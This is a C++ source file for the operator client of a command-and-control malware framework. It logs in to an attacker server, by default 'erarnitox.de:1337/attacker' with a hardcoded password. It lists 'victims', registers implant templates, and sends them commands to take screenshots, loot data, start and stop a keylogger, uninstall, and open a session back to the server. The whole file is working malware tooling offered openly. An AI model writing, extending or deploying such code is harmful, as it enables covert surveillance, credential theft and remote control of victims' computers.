#include "Client.hpp"

#include "Builder.hpp"
#include "CommandManager.hpp"
#include "Config.hpp"
#include "HttpUtils.hpp"
#include "LogDAO.hpp"
#include "LogManager.hpp"
#include "Util/SafeLogger.hpp"
#include "SessionManager.hpp"
#include "Types.hpp"
#include "VictimManager.hpp"
#include "VictimTemplateDAO.hpp"
#include <UrlUtils.hpp>

Client::Client(const std::string& db_path)
    : m_config(Config::instance(db_path)),
      m_builder(Builder::instance()),
      m_log_man(LogManager::instance()),
      m_cmd_man(CommandManager::instance()),
      m_vic_man(VictimManager::instance()),
      m_sess_man(SessionManager::instance()),
      m_gateway(""),
      m_status_text(""),
      m_last_id(0) {}

Client& Client::instance(const std::string& db_path) {
    static Client inst(db_path);
    return inst;
}

bool Client::hasServerSession() const {
    return m_config.has(Key::client_server_url_key)
        && m_config.has(Key::client_username_key)
        && m_config.has(Key::client_password_key)
        && m_config.has(Key::client_bearer_token_key);
}

std::string Client::getUsername() const {
    return m_config.get<std::string>(Key::client_username_key, "username");
}

std::string Client::getPassword() const {
    return m_config.get<std::string>(Key::client_password_key, "P4$$w0rd!");
}

std::string Client::getServerUrl() const {
    return m_config.get<std::string>(Key::client_server_url_key, "https://erarnitox.de:1337/attacker");
}

std::string Client::getServerHost() const {
    return extract_url_host(getServerUrl());
}

std::string Client::getVictimBeaconUrl() const {
    if (m_config.has(Key::client_implant_url_key)) {
        return m_builder.getServerURL();
    }

    const auto victim_port = static_cast<uint16_t>(
        m_config.get<int>(Key::client_victim_api_port_key, 3000));
    return normalize_victim_beacon_url(getServerUrl(), victim_port);
}

std::string Client::getTimeout() const {
    return m_config.get<std::string>("timeout", "10");
}

void Client::setUsername(const std::string& username) {
    m_config.set(Key::client_username_key, username);
    m_gateway.set_credentials(username, getPassword());
    updateStatusText();
}

void Client::setPassword(const std::string& password) {
    m_config.set(Key::client_password_key, password);
    m_gateway.set_credentials(getUsername(), password);
}

void Client::setServerUrl(const std::string& server_url) {
    const auto normalized_url = strip_trailing_slash(server_url);
    m_config.set(Key::client_server_url_key, normalized_url);
    m_gateway.configure(normalized_url, getUsername(), getPassword());
    updateStatusText();
}

void Client::setOutputPath(const std::string& output_dir) {
    m_config.set(Key::client_output_dir_key, output_dir);
}

void Client::setTimeout(const std::string& timeout) {
    m_config.set("timeout", timeout);
}

std::string Client::getOutputPath() const {
    return m_config.get<std::string>(Key::client_output_dir_key, "./outputs");
}

bool Client::login() {
    m_gateway.set_credentials(getUsername(), getPassword());
    const auto result = m_gateway.login();
    if (!result) {
        logger::info("Login Failed: {}", result.error().message);
        return false;
    }
    return result.value();
}

const char* Client::getStatusText() const {
    return m_status_text.c_str();
}

void Client::updateStatusText() {
    m_status_text = std::format(
        "User: [{}] | C2 Server: [{}] | Connections: [{}]",
        getUsername(),
        getServerUrl(),
        m_victim_count.load());
}

bool Client::fetchVictims() {
    m_gateway.set_credentials(getUsername(), getPassword());
    const auto result = m_gateway.fetch_victims();
    if (!result) {
        m_log_man.local_log(std::format("Fetching Victims Failed: {}", result.error().message));
        return false;
    }

    auto victims = result.value();
    m_victim_count.store(victims.size());
    m_vic_man.setList(std::move(victims));
    updateStatusText();
    return true;
}

bool Client::fetchLogs() {
    m_gateway.set_credentials(getUsername(), getPassword());
    const auto result = m_gateway.fetch_logs();
    if (!result) {
        m_log_man.local_log(std::format("Fetching Logs Failed: {}", result.error().message));
        return false;
    }

    m_log_man.set_list(result.value());
    return true;
}

bool Client::sendLogBuffer() {
    m_gateway.set_credentials(getUsername(), getPassword());
    const auto log_buffer = m_log_man.refresh_send_buffer();
    bool everything_good = true;

    for (const auto& log_dao : log_buffer) {
        const auto result = m_gateway.post_log(log_dao);
        if (!result || result->id < 0) {
            everything_good = false;
        }
    }

    if (!everything_good) {
        m_log_man.local_log("Sending Logs Failed");
    }
    return everything_good;
}

const std::vector<Victim>& Client::getVictims() const {
    return m_vic_man.getVictims();
}

bool Client::post_victim_command(const UUID& client_id, const std::string& command_text, const char* failure_label) {
    m_gateway.set_credentials(getUsername(), getPassword());

    CommandDAO cmd;
    cmd.command = command_text;
    cmd.client = client_id;
    cmd.uid = generate_uuid();
    cmd.nonce = generate_nonce();
    cmd.prev = m_last_id;
    ++m_last_id;

    const auto result = m_gateway.post_command(cmd);
    if (!result) {
        m_log_man.local_log(std::format("{}: {}", failure_label, result.error().message));
        return false;
    }
    return result->id > 0;
}

bool Client::sendTimeoutCommand(const UUID& client_id, int timeout) {
    return post_victim_command(client_id, std::format("timeout {}", timeout), "Sending Timeout Failed");
}

bool Client::registerTemplate(const std::string& username, const std::string& password) {
    m_gateway.set_credentials(getUsername(), getPassword());

    VictimTemplateCreateRequest request;
    request.username = username;
    request.password = password;

    const auto result = m_gateway.register_template(request);
    if (!result) {
        m_log_man.local_log(std::format("Registering Template Failed: {}", result.error().message));
        return false;
    }

    if (result->id > 0) {
        m_builder.setUsername(username);
        m_builder.setPassword(result->password_credential);
    }
    return result->id > 0;
}

bool Client::sendOpenSessionCommand(const UUID& client_id, int64_t port) {
    return post_victim_command(
        client_id,
        std::format("session {} {}", getServerHost(), port),
        "Sending Open Session Command Failed");
}

bool Client::sendCloseSessionCommand(const UUID& client_id) {
    return post_victim_command(client_id, "close", "Sending Close Session Command Failed");
}

bool Client::sendScreenshotCommand(const UUID& client_id) {
    return post_victim_command(client_id, "screenshot", "Sending Screenshot Command Failed");
}

bool Client::sendLootCommand(const UUID& client_id) {
    return post_victim_command(client_id, "loot", "Sending Loot Command Failed");
}

bool Client::sendStartKeyloggerCommand(const UUID& client_id) {
    return post_victim_command(client_id, "keylogger_start", "Sending Keylogger Start Failed");
}

bool Client::sendStopKeyloggerCommand(const UUID& client_id) {
    return post_victim_command(client_id, "keylogger_stop", "Sending Keylogger Stop Failed");
}

bool Client::sendUninstallCommand(const UUID& client_id) {
    return post_victim_command(client_id, "uninstall", "Sending Uninstall Command Failed");
}

bool Client::openSession(int64_t port) {
    m_gateway.set_credentials(getUsername(), getPassword());
    const auto result = m_gateway.open_session(port);
    if (!result) {
        logger::warn("Opening Session on the Server Failed: {}", result.error().message);
        m_log_man.local_log(std::format("Opening Session on the Server Failed: {}", result.error().message));
        return false;
    }
    logger::success("Response: {}", result.value());
    return not result->empty();
}

bool Client::closeSession(int64_t port) {
    m_gateway.set_credentials(getUsername(), getPassword());
    const auto result = m_gateway.close_session(port);
    if (!result) {
        logger::warn("Closing Session on the Server Failed: {}", result.error().message);
        m_log_man.local_log(std::format("Closing Session on the Server Failed: {}", result.error().message));
        return false;
    }
    return not result->empty();
}

bool Client::sendTimeoutCommand(int64_t client_id, int timeout) {
    return sendTimeoutCommand(m_vic_man.getVictim(client_id).uid, timeout);
}

bool Client::sendOpenSessionCommand(int64_t client_id, int64_t port) {
    return sendOpenSessionCommand(m_vic_man.getVictim(client_id).uid, port);
}

bool Client::sendCloseSessionCommand(int64_t client_id) {
    return sendCloseSessionCommand(m_vic_man.getVictim(client_id).uid);
}

bool Client::sendScreenshotCommand(int64_t client_id) {
    return sendScreenshotCommand(m_vic_man.getVictim(client_id).uid);
}

bool Client::sendLootCommand(int64_t client_id) {
    return sendLootCommand(m_vic_man.getVictim(client_id).uid);
}

bool Client::sendStartKeyloggerCommand(int64_t client_id) {
    return sendStartKeyloggerCommand(m_vic_man.getVictim(client_id).uid);
}

bool Client::sendStopKeyloggerCommand(int64_t client_id) {
    return sendStopKeyloggerCommand(m_vic_man.getVictim(client_id).uid);
}

bool Client::sendUninstallCommand(int64_t client_id) {
    return sendUninstallCommand(m_vic_man.getVictim(client_id).uid);
}
